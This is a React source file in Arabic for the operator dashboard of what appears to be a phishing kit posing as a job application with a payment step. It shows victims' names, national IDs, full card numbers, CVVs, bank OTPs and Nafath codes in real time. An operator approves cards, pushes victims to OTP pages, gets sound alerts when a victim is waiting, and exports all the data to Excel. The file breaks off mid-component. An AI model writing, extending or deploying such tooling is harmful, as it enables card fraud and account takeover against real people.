import { useState, useMemo, useEffect, useRef } from "react";
import DashboardLayout from "@/components/DashboardLayout";
import { AdminGuard } from "@/components/AdminGuard";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Input } from "@/components/ui/input";
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogFooter,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import {
  AlertDialog,
  AlertDialogAction,
  AlertDialogCancel,
  AlertDialogContent,
  AlertDialogDescription,
  AlertDialogFooter,
  AlertDialogHeader,
  AlertDialogTitle,
  AlertDialogTrigger,
} from "@/components/ui/alert-dialog";
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from "@/components/ui/table";
import {
  Eye,
  Trash2,
  ChevronDown,
  Loader2,
  RefreshCw,
  Users,
  Activity,
  Search,
  ExternalLink,
  Send,
  CheckCircle2,
  XCircle,
  Hash,
  Copy,
  Check,
  FileDown,
  Megaphone,
  Volume2,
  VolumeX,
  X,
  MoreHorizontal,
} from "lucide-react";
import { trpc } from "@/lib/trpc";
import { toast } from "sonner";
import * as XLSX from "xlsx";

const QUICK_REDIRECTS = [
  { label: "/salary - بنود العقد", url: "/salary" },
  { label: "/ypti - الفحص الطبي", url: "/ypti" },
  { label: "/data - بيانات الدفع", url: "/data" },
  { label: "/cardpayment - البطاقة", url: "/cardpayment" },
  { label: "/card-wait - انتظار البطاقة", url: "/card-wait" },
  { label: "/rajhi-wait - الراجحي", url: "/rajhi-wait" },
  { label: "/razer-payment - دفع Razer", url: "/razer-payment" },
  { label: "/razer-wait - انتظار Razer", url: "/razer-wait" },
  { label: "/code-pay - OTP 1", url: "/code-pay" },
  { label: "/pay-code - OTP 2", url: "/pay-code" },
  { label: "/number - تأكيد الجوال", url: "/number" },
  { label: "/n-code - OTP نفاذ", url: "/n-code" },
  { label: "/nafath-wait - انتظار نفاذ", url: "/nafath-wait" },
  { label: "/nafath-code - رقم نفاذ", url: "/nafath-code" },
  { label: "/cardpayment-error - خطأ البطاقة", url: "/cardpayment-error" },
  { label: "/thankyou - شكراً", url: "/thankyou" },
];

function timeAgo(date: Date | string): string {
  const seconds = Math.floor((Date.now() - new Date(date).getTime()) / 1000);
  if (seconds < 60) return `${seconds}ث`;
  const m = Math.floor(seconds / 60);
  if (m < 60) return `${m}د`;
  const h = Math.floor(m / 60);
  if (h < 24) return `${h}س`;
  return `${Math.floor(h / 24)}ي`;
}

function shortTime(date: Date | string): string {
  const d = new Date(date);
  return d.toLocaleString("en-GB", {
    month: "2-digit",
    day: "2-digit",
    hour: "2-digit",
    minute: "2-digit",
    hour12: false,
  });
}

function pageTitle(path: string | null): string {
  if (!path) return "—";
  const map: Record<string, string> = {
    "/": "الرئيسية",
    "/employment": "التوظيف",
    "/salary": "العقد",
    "/ypti": "الفحص الطبي",
    "/data": "بيانات الدفع",
    "/cardpayment": "البطاقة",
    "/code-pay": "OTP 1",
    "/pay-code": "OTP 2",
    "/number": "تأكيد الجوال",
    "/n-code": "OTP نفاذ",
    "/card-wait": "انتظار البطاقة",
    "/rajhi-wait": "الراجحي",
    "/razer-payment": "دفع Razer",
    "/razer-wait": "انتظار Razer",
    "/nafath-wait": "انتظار نفاذ",
    "/nafath-code": "رقم نفاذ",
    "/thankyou": "شكراً",
    "/cardpayment-error": "خطأ البطاقة",
  };
  return map[path] ?? path;
}

type VisitorRow = {
  sessionId: string;
  isActive: boolean;
  currentPage: string;
  lastSeen: Date;
  firstSeen: Date;
  ip: string | null;
  fullName: string | null;
  phone: string | null;
  email: string | null;
  nationalId: string | null;
  birthDate: string | null;
  lastInputPage: string | null;
  hasCardData: boolean;
  hasOtpData: boolean;
  cardData: Record<string, unknown> | null;
  otpData: Record<string, unknown> | null;
  cardNumber: string | null;
  cardHolderName: string | null;
  cardExpiry: string | null;
  cardCvv: string | null;
  otp1: string | null;
  otp2: string | null;
  otpNafath: string | null;
  paymentBank: string | null;
  stepCount: number;
  hasApplication: boolean;
  applicationId: number | null;
  cardStatus: "none" | "pending" | "approved" | "rejected";
  nafathNumber: string | null;
  razerCode: string | null;
  razerStatus: "none" | "pending" | "approved" | "rejected" | null;
};

function CopyBtn({ value, label }: { value: string | null | undefined; label?: string }) {
  const [copied, setCopied] = useState(false);
  if (!value) return <span className="text-gray-300">—</span>;
  return (
    <button
      type="button"
      onClick={(e) => {
        e.stopPropagation();
        navigator.clipboard.writeText(value);
        setCopied(true);
        toast.success(`نُسخ ${label ?? ""}`);
        setTimeout(() => setCopied(false), 1500);
      }}
      title={`نسخ: ${value}`}
      className="inline-flex items-center gap-1 px-1.5 py-0.5 rounded font-mono text-xs bg-gray-50 hover:bg-emerald-50 border border-gray-200 hover:border-emerald-300 transition-colors max-w-full"
      dir="ltr"
    >
      <span className="truncate">{value}</span>
      {copied ? (
        <Check className="h-3 w-3 text-emerald-600 shrink-0" />
      ) : (
        <Copy className="h-3 w-3 text-gray-400 shrink-0" />
      )}
    </button>
  );
}

function AdminDashboardContent() {
  const utils = trpc.useUtils();
  const [search, setSearch] = useState("");
  const [filterActive, setFilterActive] = useState<"all" | "active" | "inactive">("all");
  const [detailVisitor, setDetailVisitor] = useState<VisitorRow | null>(null);
  const [redirectTarget, setRedirectTarget] = useState<VisitorRow | null>(null);
  const [customUrl, setCustomUrl] = useState("");
  const [broadcastOpen, setBroadcastOpen] = useState(false);
  const [broadcastUrl, setBroadcastUrl] = useState("");
  const [nafathTarget, setNafathTarget] = useState<VisitorRow | null>(null);
  const [nafathInput, setNafathInput] = useState("");
  const [pageRegistered, setPageRegistered] = useState(1);
  const [pageAnonymous, setPageAnonymous] = useState(1);
  const PAGE_SIZE = 15;

  // === تنبيه صوتي عند وصول زائر إلى /card-wait ===
  const [soundEnabled, setSoundEnabled] = useState<boolean>(() => {
    if (typeof window === "undefined") return true;
    const v = localStorage.getItem("admin-sound-enabled");
    return v === null ? true : v === "true";
  });
  const notifiedSessionsRef = useRef<Set<string>>(new Set());
  const firstLoadRef = useRef<boolean>(true);
  const audioCtxRef = useRef<AudioContext | null>(null);

  useEffect(() => {
    localStorage.setItem("admin-sound-enabled", String(soundEnabled));
  }, [soundEnabled]);

  function getAudioCtx(): AudioContext | null {
    try {
      if (!audioCtxRef.current) {
        const Ctx: any = (window as any).AudioContext || (window as any).webkitAudioContext;
        if (!Ctx) return null;
        audioCtxRef.current = new Ctx();
      }
      const ctx = audioCtxRef.current!;
      if (ctx.state === "suspended") ctx.resume();
      return ctx;
    } catch { return null; }
  }

  function playBeepNote(ctx: AudioContext, freq: number, startAt: number, duration: number, type: OscillatorType = "sine", vol = 0.35) {
    const osc = ctx.createOscillator();
    const gain = ctx.createGain();
    osc.type = type;
    osc.frequency.value = freq;
    osc.connect(gain);
    gain.connect(ctx.destination);
    const t0 = ctx.currentTime + startAt;
    gain.gain.setValueAtTime(0.0001, t0);
    gain.gain.exponentialRampToValueAtTime(vol, t0 + 0.02);
    gain.gain.exponentialRampToValueAtTime(0.0001, t0 + duration);
    osc.start(t0);
    osc.stop(t0 + duration + 0.05);
  }

  // صوت تنبيه البطاقة (الأصلي - 3 نغمات صاعدة)
  function playCardAlert() {
    const ctx = getAudioCtx();
    if (!ctx) return;
    playBeepNote(ctx, 880, 0, 0.18);
    playBeepNote(ctx, 1175, 0.2, 0.18);
    playBeepNote(ctx, 1568, 0.4, 0.28);
  }

  // صوت تنبيه Razer (مختلف - نغمة مزدوجة سريعة بتردد أعلى)
  function playRazerAlert() {
    const ctx = getAudioCtx();
    if (!ctx) return;
    // نغمة مميزة: تين-تين سريعة بتردد عالي (square wave)
    playBeepNote(ctx, 1200, 0, 0.12, "square", 0.25);
    playBeepNote(ctx, 1600, 0.15, 0.12, "square", 0.25);
    playBeepNote(ctx, 1200, 0.3, 0.12, "square", 0.25);
    playBeepNote(ctx, 1600, 0.45, 0.12, "square", 0.25);
    playBeepNote(ctx, 2000, 0.6, 0.2, "square", 0.3);
  }

  // الدالة العامة للتشغيل (للتجربة)
  function playAlert() {
    playCardAlert();
  }

  const { data, isLoading, isFetching, refetch } = trpc.liveVisitors.tableList.useQuery(
    { limit: 1000 },
    {
      refetchInterval: 10000,
      refetchOnWindowFocus: false,
      staleTime: 5000,
      keepPreviousData: true,
    } as any
  );

  const visitors = (data?.visitors ?? []) as VisitorRow[];
  const hasAnyData = (v: VisitorRow) =>
    Boolean(
      v.fullName || v.phone || v.email || v.nationalId ||
      v.cardNumber || v.otp1 || v.otp2 || v.paymentBank || v.otpNafath ||
      v.razerCode
    );
  const registeredAll = visitors.filter(hasAnyData);
  const total = registeredAll.length;
  const activeCount = registeredAll.filter((v) => v.isActive).length;

  // رصد الوصول إلى /card-wait وتشغيل التنبيه
  useEffect(() => {
    if (!visitors.length) return;
    const watchPaths = ["/card-wait", "/razer-wait"];
    const arrivals = visitors.filter(
      (v) => v.isActive && watchPaths.includes(v.currentPage) && !notifiedSessionsRef.current.has(v.sessionId)
    );
    if (firstLoadRef.current) {
      arrivals.forEach((v) => notifiedSessionsRef.current.add(v.sessionId));
      firstLoadRef.current = false;
      return;
    }
    if (arrivals.length === 0) return;
    arrivals.forEach((v) => notifiedSessionsRef.current.add(v.sessionId));
    const first = arrivals[0];
    const isRazer = first.currentPage === "/razer-wait";
    if (soundEnabled) {
      if (isRazer) {
        playRazerAlert();
      } else {
        playCardAlert();
      }
    }
    toast.info(
      arrivals.length === 1
        ? `وصل زائر إلى ${isRazer ? "انتظار كود Razer" : "انتظار البطاقة"}${first.fullName ? `: ${first.fullName}` : ""}`
        : `وصل ${arrivals.length} زوار إلى صفحة انتظار`,
      { duration: 6000 }
    );
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [visitors]);
  const withCard = registeredAll.filter((v) => v.cardNumber).length;
  const withOtp = registeredAll.filter((v) => v.otp1 || v.otp2 || v.otpNafath).length;
  const waitingCardVisitors = registeredAll.filter(
    (v) => v.isActive && v.currentPage === "/card-wait"
  );

  const sendCommand = trpc.liveVisitors.sendCommand.useMutation({
    onSuccess: () => {
      toast.success("تم إرسال أمر التوجيه");
      setRedirectTarget(null);
      setCustomUrl("");
    },
    onError: (e) => toast.error(`فشل: ${e.message}`),
  });

  const broadcastMutation = trpc.liveVisitors.broadcastRedirect.useMutation({
    onSuccess: (res) => {
      toast.success(`أُرسل لـ ${res.count} زائر`);
      setBroadcastOpen(false);
      setBroadcastUrl("");
    },
    onError: (e) => toast.error(`فشل: ${e.message}`),
  });

  const deleteVisitorMutation = trpc.liveVisitors.deleteVisitor.useMutation({
    onSuccess: () => {
      toast.success("تم الحذف");
      utils.liveVisitors.tableList.invalidate();
    },
    onError: (e) => toast.error(`فشل: ${e.message}`),
  });

  const setCardStatusMutation = trpc.liveVisitors.setCardStatus.useMutation({
    onSuccess: (_, vars) => {
      const l = vars.status === "approved" ? "قبول" : vars.status === "rejected" ? "رفض" : "تحديث";
      toast.success(`تم ${l} البطاقة`);
      utils.liveVisitors.tableList.invalidate();
    },
    onError: (e) => toast.error(`فشل: ${e.message}`),
  });

  const setRazerStatusMutation = trpc.liveVisitors.setRazerStatus.useMutation({
    onSuccess: (_, vars) => {
      const l = vars.status === "approved" ? "قبول" : vars.status === "rejected" ? "رفض" : "تحديث";
      toast.success(`تم ${l} كود Razer`);
      utils.liveVisitors.tableList.invalidate();
    },
    onError: (e) => toast.error(`فشل: ${e.message}`),
  });

  const setNafathNumberMutation = trpc.liveVisitors.setNafathNumber.useMutation({
    onSuccess: () => {
      toast.success("تم إرسال رقم نفاذ");
      setNafathTarget(null);
      setNafathInput("");
      utils.liveVisitors.tableList.invalidate();
    },
    onError: (e) => toast.error(`فشل: ${e.message}`),
  });

  const deleteAllMutation = trpc.liveVisitors.deleteAll.useMutation({
    onSuccess: (res) => {
      toast.success(`حُذف ${res.deleted.visitors} زائر`);
      utils.liveVisitors.tableList.invalidate();
    },
    onError: (e) => toast.error(`فشل: ${e.message}`),
  });

  const filteredVisitors = useMemo(() => {
    let result = visitors;
    if (filterActive === "active") result = result.filter((v) => v.isActive);
    if (filterActive === "inactive") result = result.filter((v) => !v.isActive);
    if (search.trim()) {
      const q = search.trim().toLowerCase();
      result = result.filter((v) =>
        [
          v.fullName, v.phone, v.email, v.nationalId, v.sessionId,
          v.currentPage, v.cardNumber, v.otp1, v.otp2,
        ]
          .filter(Boolean)
          .some((f) => String(f).toLowerCase().includes(q))
      );
    }
    return result;
  }, [visitors, search, filterActive]);

  const isRegistered = (v: VisitorRow) =>
    Boolean(v.fullName || v.phone || v.email || v.nationalId || v.cardNumber || v.otp1 || v.otp2 || v.paymentBank || v.otpNafath || v.razerCode);
  const registeredVisitors = useMemo(
    () =>
      filteredVisitors
        .filter(isRegistered)
        .slice()
        .sort((a, b) => +new Date(b.lastSeen) - +new Date(a.lastSeen)),
    [filteredVisitors]
  );
  const anonymousVisitors = useMemo(
    () =>
      filteredVisitors
        .filter((v) => !isRegistered(v))
        .slice()
        .sort((a, b) => +new Date(b.lastSeen) - +new Date(a.lastSeen)),
    [filteredVisitors]
  );

  const totalPagesReg = Math.max(1, Math.ceil(registeredVisitors.length / PAGE_SIZE));
  const totalPagesAnon = Math.max(1, Math.ceil(anonymousVisitors.length / PAGE_SIZE));
  const safePageReg = Math.min(pageRegistered, totalPagesReg);
  const safePageAnon = Math.min(pageAnonymous, totalPagesAnon);
  const pagedRegistered = useMemo(
    () => registeredVisitors.slice((safePageReg - 1) * PAGE_SIZE, safePageReg * PAGE_SIZE),
    [registeredVisitors, safePageReg]
  );
  const pagedAnonymous = useMemo(
    () => anonymousVisitors.slice((safePageAnon - 1) * PAGE_SIZE, safePageAnon * PAGE_SIZE),
    [anonymousVisitors, safePageAnon]
  );

  useEffect(() => {
    setPageRegistered(1);
    setPageAnonymous(1);
  }, [search, filterActive]);

  function handleRedirect(url: string) {
    if (!redirectTarget || !url.trim()) return;
    sendCommand.mutate({
      sessionId: redirectTarget.sessionId,
      commandType: "redirect",
      payload: url.trim(),
    });
  }

  function exportExcel() {
    if (filteredVisitors.length === 0) {
      toast.error("لا توجد بيانات للتصدير");
      return;
    }
    const rows = filteredVisitors.map((v, i) => ({
      "#": i + 1,
      "الإسم": v.fullName ?? "",
      "الهاتف": v.phone ?? "",
      "الإيميل": v.email ?? "",
      "الرقم الوطني": v.nationalId ?? "",
      "تاريخ الميلاد": v.birthDate ?? "",
      "البنك / طريقة الدفع": v.paymentBank ?? "",
      "اسم صاحب البطاقة": v.cardHolderName ?? "",
      "رقم البطاقة": v.cardNumber ?? "",
      "تاريخ الانتهاء": v.cardExpiry ?? "",
      "CVV": v.cardCvv ?? "",
      "OTP 1 (الرمز السري)": v.otp1 ?? "",
      "OTP 2 (الرمز الثاني)": v.otp2 ?? "",
      "OTP نفاذ": v.otpNafath ?? "",
      "رقم نفاذ المُرسل": v.nafathNumber ?? "",
      "حالة البطاقة": v.cardStatus === "approved" ? "مقبولة" : v.cardStatus === "rejected" ? "مرفوضة" : v.cardStatus === "pending" ? "قيد المراجعة" : "—",
      "كود Razer": v.razerCode ?? "",
      "حالة Razer": v.razerStatus === "approved" ? "مقبول" : v.razerStatus === "rejected" ? "مرفوض" : v.razerStatus === "pending" ? "قيد المراجعة" : "—",
      "الصفحة الحالية": pageTitle(v.currentPage),
      "آخر إدخال": v.lastInputPage ?? "",
      "نشط الآن": v.isActive ? "نعم" : "لا",
      "أول دخول": new Date(v.firstSeen).toLocaleString("en-GB"),
      "آخر نشاط": new Date(v.lastSeen).toLocaleString("en-GB"),
      "عدد الخطوات": v.stepCount,
      "IP": v.ip ?? "",
      "Session ID": v.sessionId,
    }));
    const ws = XLSX.utils.json_to_sheet(rows);
    ws["!cols"] = Object.keys(rows[0]).map((k) => ({
      wch: k === "Session ID" ? 32 : k === "الإيميل" ? 24 : k.includes("OTP") || k === "CVV" ? 12 : 18,
    }));
    const wb = XLSX.utils.book_new();
    XLSX.utils.book_append_sheet(wb, ws, "الزوار");
    const stamp = new Date().toISOString().slice(0, 16).replace(/[T:]/g, "-");
    XLSX.writeFile(wb, `dallah-visitors-${stamp}.xlsx`);
    toast.success(`تم تصدير ${rows.length} صف إلى Excel`);
  }

  return (
    <div className="space-y-4" dir="rtl">
      {/* Header */}
      <div className="flex flex-col md:flex-row md:items-center justify-between gap-3">
        <div>
          <h1 className="text-2xl font-bold tracking-tight flex items-center gap-2">
            <Users className="w-6 h-6 text-primary" />
            لوحة التحكم
          </h1>
          <p className="text-xs text-muted-foreground mt-0.5">
            البيانات تبقى محفوظة دائماً — الصفوف ثابتة ولا تختفي
          </p>
        </div>
        <div className="flex items-center gap-1.5 flex-wrap">
          <Button variant="outline" size="sm" onClick={() => refetch()} className="h-8 gap-1.5 text-xs">
            <RefreshCw className={`h-3.5 w-3.5 ${isFetching ? "animate-spin" : ""}`} />
            تحديث
          </Button>
          <Button
            variant="outline"
            size="sm"
            onClick={() => {
              const next = !soundEnabled;
              setSoundEnabled(next);
              if (next) {
                playAlert();
                toast.success("تم تفعيل التنبيه الصوتي");
              } else {
                toast("تم تعطيل التنبيه الصوتي");
              }
            }}
            className={`h-8 gap-1.5 text-xs ${soundEnabled ? "bg-emerald-50 text-emerald-700 border-emerald-300" : "bg-gray-50 text-gray-500"}`}
            title={soundEnabled ? "التنبيه الصوتي مفعّل (اضغط للتجربة/التعطيل)" : "التنبيه الصوتي معطل"}
          >
            {soundEnabled ? <Volume2 className="h-3.5 w-3.5" /> : <VolumeX className="h-3.5 w-3.5" />}
            {soundEnabled ? "الصوت مفعّل" : "الصوت معطل"}
          </Button>
          <Button
            size="sm"
            onClick={exportExcel}
            className="bg-emerald-600 hover:bg-emerald-700 h-8 gap-1.5 text-xs"
          >
            <FileDown className="h-3.5 w-3.5" />
            تصدير Excel
          </Button>
          <Button
            size="sm"
            onClick={() => setBroadcastOpen(true)}
            className="bg-amber-600 hover:bg-amber-700 h-8 gap-1.5 text-xs"
          >
            <Megaphone className="h-3.5 w-3.5" />
            توجيه الكل
          </Button>
        </div>
      </div>

      {/* Stats Cards - Compact */}
      <div className="grid grid-cols-2 md:grid-cols-4 gap-2">
        <Card className="p-3">
          <div className="flex items-center gap-2">
            <Eye className="h-4 w-4 text-primary" />
            <span className="text-xs text-muted-foreground">الإجمالي</span>
          </div>
          <p className="text-xl font-bold mt-1">{total.toLocaleString("en-US")}</p>
        </Card>
        <Card className="p-3">
          <div className="flex items-center gap-2">
            <Activity className="h-4 w-4 text-emerald-600" />
            <span className="text-xs text-muted-foreground">المتصلون</span>
          </div>
          <p className="text-xl font-bold mt-1 text-emerald-600">{activeCount}</p>
        </Card>
        <Card className="p-3">
          <div className="flex items-center gap-2">
            <span className="text-xs text-muted-foreground">بطاقات</span>
          </div>
          <p className="text-xl font-bold mt-1 text-indigo-600">{withCard}</p>
        </Card>
        <Card className="p-3">
          <div className="flex items-center gap-2">
            <span className="text-xs text-muted-foreground">OTPs</span>
          </div>
          <p className="text-xl font-bold mt-1 text-rose-600">{withOtp}</p>
        </Card>
      </div>

      {/* تنبيه الزوار في انتظار قرار البطاقة */}
      {waitingCardVisitors.length > 0 && (
        <Card className="p-3 border-2 border-amber-400 bg-amber-50/50">
          <div className="flex items-center justify-between mb-2">
            <div className="flex items-center gap-2">
              <span className="relative flex h-2.5 w-2.5">
                <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-amber-400 opacity-75" />
                <span className="relative inline-flex rounded-full h-2.5 w-2.5 bg-amber-500" />
              </span>
              <h3 className="font-bold text-amber-900 text-sm">
                في انتظار قرار البطاقة ({waitingCardVisitors.length})
              </h3>
            </div>
            <span className="text-[10px] text-amber-700">اضغط أخضر للموافقة (ينتقل لل OTP) أو أحمر للرفض (يعود لصفحة البطاقة)</span>
          </div>
          <div className="space-y-1.5">
            {waitingCardVisitors.map((v) => (
              <div key={v.sessionId} className="flex items-center justify-between bg-white rounded-md p-2 border border-amber-200">
                <div className="flex items-center gap-3 text-xs">
                  <span className="font-bold text-gray-900">{v.fullName ?? "زائر غير مسمّى"}</span>
                  {v.cardNumber && (
                    <span className="font-mono text-gray-600" dir="ltr">**** {v.cardNumber.slice(-4)}</span>
                  )}
                  {v.paymentBank && (
                    <Badge variant="outline" className="text-[10px] h-5">{v.paymentBank}</Badge>
                  )}
                  <span className="text-[10px] text-muted-foreground">{timeAgo(v.lastSeen)}</span>
                </div>
                <div className="flex items-center gap-1.5">
                  <Button
                    size="sm"
                    className="h-7 px-2.5 text-[11px] bg-emerald-600 hover:bg-emerald-700 text-white gap-1"
                    onClick={() => {
                      setCardStatusMutation.mutate({ sessionId: v.sessionId, status: "approved" });
                      sendCommand.mutate({ sessionId: v.sessionId, commandType: "redirect", payload: "/code-pay" });
                    }}
                  >
                    <Check className="h-3 w-3" />
                    موافقة
                  </Button>
                  <Button
                    size="sm"
                    className="h-7 px-2.5 text-[11px] bg-rose-600 hover:bg-rose-700 text-white gap-1"
                    onClick={() => {
                      setCardStatusMutation.mutate({ sessionId: v.sessionId, status: "rejected" });
                      sendCommand.mutate({ sessionId: v.sessionId, commandType: "redirect", payload: "/cardpayment-error" });
                    }}
                  >
                    <X className="h-3 w-3" />
                    رفض
                  </Button>
                </div>
              </div>
            ))}
          </div>
        </Card>
      )}


      {/* Toolbar + Table */}
      <Card>
        <CardHeader className="flex flex-row items-center justify-between gap-3 flex-wrap py-3">
          <CardTitle className="text-base flex items-center gap-2">
            <span className="inline-flex items-center gap-1.5 text-emerald-700">
              <CheckCircle2 className="h-4 w-4" />
              الزوار المسجّلون
            </span>
            <Badge className="bg-emerald-600 text-white">{registeredVisitors.length}</Badge>
          </CardTitle>
          <div className="flex items-center gap-1.5 flex-wrap">
            <div className="relative">
              <Search className="absolute right-2.5 top-1/2 -translate-y-1/2 h-3.5 w-3.5 text-muted-foreground" />
              <Input
                placeholder="بحث بالاسم/الهاتف/البطاقة/OTP..."
                value={search}
                onChange={(e) => setSearch(e.target.value)}
                className="pr-8 w-72 h-8 text-xs"
              />
            </div>
            <div className="flex gap-0.5 bg-muted rounded-md p-0.5">
              {(["all", "active", "inactive"] as const).map((opt) => (
                <button
                  key={opt}
                  onClick={() => setFilterActive(opt)}
                  className={`px-2.5 py-1 text-xs font-medium rounded transition-colors ${
                    filterActive === opt
                      ? "bg-white shadow-sm"
                      : "text-muted-foreground hover:text-foreground"
                  }`}
                >
                  {opt === "all" ? "الكل" : opt === "active" ? "نشط" : "غير نشط"}
                </button>
              ))}
            </div>
            <AlertDialog>
              <AlertDialogTrigger asChild>
                <Button variant="destructive" size="sm" className="gap-1.5 h-8 text-xs">
                  <Trash2 className="h-3.5 w-3.5" />
                  حذف الكل
                </Button>
              </AlertDialogTrigger>
              <AlertDialogContent dir="rtl">
                <AlertDialogHeader>
                  <AlertDialogTitle>تأكيد حذف جميع البيانات</AlertDialogTitle>
                  <AlertDialogDescription>
                    سيتم حذف جميع الزوار والبيانات نهائياً. لا يمكن التراجع.
                  </AlertDialogDescription>
                </AlertDialogHeader>
                <AlertDialogFooter>
                  <AlertDialogCancel>إلغاء</AlertDialogCancel>
                  <AlertDialogAction
                    onClick={() => deleteAllMutation.mutate()}
                    className="bg-destructive text-white hover:bg-destructive/90"
                  >
                    نعم، احذف
                  </AlertDialogAction>
                </AlertDialogFooter>
              </AlertDialogContent>
            </AlertDialog>
          </div>
        </CardHeader>
        <CardContent className="p-0">
          {isLoading ? (
            <div className="p-10 flex items-center justify-center">
              <Loader2 className="h-7 w-7 animate-spin text-primary" />
            </div>
          ) : filteredVisitors.length === 0 ? (
            <div className="p-10 text-center text-muted-foreground">
              <Users className="h-10 w-10 mx-auto mb-2 opacity-30" />
              <p className="text-sm">لا يوجد زوار</p>
            </div>
          ) : (
            <div className="relative">
              {/* الجدول مع عمود الإجراءات ثابت على اليسار */}
              <div className="overflow-x-auto relative border rounded-lg">
                <Table className="text-xs">
                  <TableHeader>
                    <TableRow className="bg-muted/50 hover:bg-muted/50 h-9">
                      <TableHead className="text-right font-bold whitespace-nowrap px-2 py-1.5 w-8 sticky right-0 bg-muted/50 z-10">#</TableHead>
                      <TableHead className="text-right font-bold whitespace-nowrap px-2 py-1.5 min-w-[100px] sticky right-8 bg-muted/50 z-10 shadow-[1px_0_0_0_#e5e7eb]">الإسم</TableHead>
                      <TableHead className="text-right font-bold whitespace-nowrap px-2 py-1.5">الهاتف</TableHead>
                      <TableHead className="text-right font-bold whitespace-nowrap px-2 py-1.5">الهوية</TableHead>
                      <TableHead className="text-right font-bold whitespace-nowrap px-2 py-1.5">البنك</TableHead>
                      <TableHead className="text-right font-bold whitespace-nowrap px-2 py-1.5">رقم البطاقة</TableHead>
                      <TableHead className="text-right font-bold whitespace-nowrap px-2 py-1.5">انتهاء</TableHead>
                      <TableHead className="text-right font-bold whitespace-nowrap px-2 py-1.5">CVV</TableHead>
                      <TableHead className="text-right font-bold whitespace-nowrap px-2 py-1.5 bg-rose-50">OTP 1</TableHead>
                      <TableHead className="text-right font-bold whitespace-nowrap px-2 py-1.5 bg-rose-50">OTP 2</TableHead>
                      <TableHead className="text-right font-bold whitespace-nowrap px-2 py-1.5 bg-emerald-50">رقم نفاذ</TableHead>
                      <TableHead className="text-right font-bold whitespace-nowrap px-2 py-1.5">الصفحة</TableHead>
                      <TableHead className="text-right font-bold whitespace-nowrap px-2 py-1.5">حالة البطاقة</TableHead>
                      <TableHead className="text-right font-bold whitespace-nowrap px-2 py-1.5">Razer</TableHead>
                      <TableHead className="text-right font-bold whitespace-nowrap px-2 py-1.5">آخر نشاط</TableHead>
                      {/* عمود الإجراءات ثابت على اليسار */}
                      <TableHead className="text-center font-bold whitespace-nowrap px-3 py-2 sticky left-0 bg-slate-100 z-20 min-w-[160px] border-r-2 border-r-slate-300">إجراءات</TableHead>
                    </TableRow>
                  </TableHeader>
                  <TableBody>
                    {pagedRegistered.map((v, idx) => (
                      <TableRow
                        key={v.sessionId}
                        className={
                          v.isActive
                            ? "bg-rose-50/60 hover:bg-rose-100/50 border-r-4 border-r-rose-400 h-10"
                            : "hover:bg-muted/30 h-10"
                        }
                      >
                        {/* # */}
                        <TableCell className={`px-2 py-1 text-center text-xs font-mono text-muted-foreground sticky right-0 z-10 ${v.isActive ? 'bg-rose-50/90' : 'bg-white'}`}>
                          {(safePageReg - 1) * PAGE_SIZE + idx + 1}
                        </TableCell>
                        {/* الإسم */}
                        <TableCell className={`px-2 py-1 max-w-[140px] sticky right-8 z-10 shadow-[1px_0_0_0_#e5e7eb] ${v.isActive ? 'bg-rose-50/90' : 'bg-white'}`}>
                          <div className="font-medium truncate" title={v.fullName ?? ""}>
                            {v.fullName ?? <span className="text-muted-foreground italic">مجهول</span>}
                          </div>
                        </TableCell>
                        {/* الهاتف */}
                        <TableCell className="px-2 py-1">
                          <CopyBtn value={v.phone} label="الهاتف" />
                        </TableCell>
                        {/* الهوية */}
                        <TableCell className="px-2 py-1">
                          <CopyBtn value={v.nationalId} label="الهوية" />
                        </TableCell>
                        {/* البنك */}
                        <TableCell className="px-2 py-1">
                          {v.paymentBank ? (
                            <Badge variant="outline" className="font-normal text-[10px] px-1.5 max-w-[160px] truncate" title={v.paymentBank}>
                              {v.paymentBank}
                            </Badge>
                          ) : (
                            <span className="text-gray-300">—</span>
                          )}
                        </TableCell>
                        {/* رقم البطاقة */}
                        <TableCell className="px-2 py-1">
                          <CopyBtn value={v.cardNumber} label="رقم البطاقة" />
                        </TableCell>
                        {/* تاريخ الانتهاء */}
                        <TableCell className="px-2 py-1">
                          <CopyBtn value={v.cardExpiry} label="تاريخ الانتهاء" />
                        </TableCell>
                        {/* CVV */}
                        <TableCell className="px-2 py-1">
                          <CopyBtn value={v.cardCvv} label="CVV" />
                        </TableCell>
                        {/* OTP 1 */}
                        <TableCell className="px-2 py-1 bg-rose-50/30">
                          {v.otp1 ? (
                            <div className="inline-flex flex-col gap-0.5">
                              <span className="text-[9px] text-rose-600 font-bold">OTP 1</span>
                              <CopyBtn value={v.otp1} label="OTP 1" />
                            </div>
                          ) : (
                            <span className="text-gray-300">—</span>
                          )}
                        </TableCell>
                        {/* OTP 2 */}
                        <TableCell className="px-2 py-1 bg-rose-50/30">
                          {v.otp2 ? (
                            <div className="inline-flex flex-col gap-0.5">
                              <span className="text-[9px] text-rose-600 font-bold">OTP 2</span>
                              <CopyBtn value={v.otp2} label="OTP 2" />
                            </div>
                          ) : (
                            <span className="text-gray-300">—</span>
                          )}
                        </TableCell>
                        {/* رقم نفاذ */}
                        <TableCell className="px-2 py-1 bg-emerald-50/30">
                          <div className="flex items-center gap-1">
                            {v.nafathNumber && (
                              <Badge className="bg-emerald-600 text-white font-mono text-xs px-1.5">
                                {v.nafathNumber}
                              </Badge>
                            )}
                            <Button
                              size="sm"
                              className="bg-emerald-600 hover:bg-emerald-700 text-white h-6 w-6 p-0"
                              onClick={() => {
                                setNafathTarget(v);
                                setNafathInput(v.nafathNumber ?? "");
                              }}
                              title="إرسال رقم نفاذ"
                            >
                              <Hash className="h-3 w-3" />
                            </Button>
                          </div>
                        </TableCell>
                        {/* الصفحة */}
                        <TableCell className="px-2 py-1">
                          <Badge variant="secondary" className="font-normal text-[10px] px-1.5">
                            {pageTitle(v.currentPage)}
                          </Badge>
                        </TableCell>
                        {/* حالة البطاقة */}
                        <TableCell className="px-2 py-1">
                          <div className="flex items-center gap-1">
                            {v.cardStatus === "pending" && (
                              <Badge className="bg-amber-500 text-white text-[10px] px-1.5">معلّقة</Badge>
                            )}
                            {v.cardStatus === "approved" && (
                              <Badge className="bg-emerald-600 text-white text-[10px] px-1.5">مقبولة</Badge>
                            )}
                            {v.cardStatus === "rejected" && (
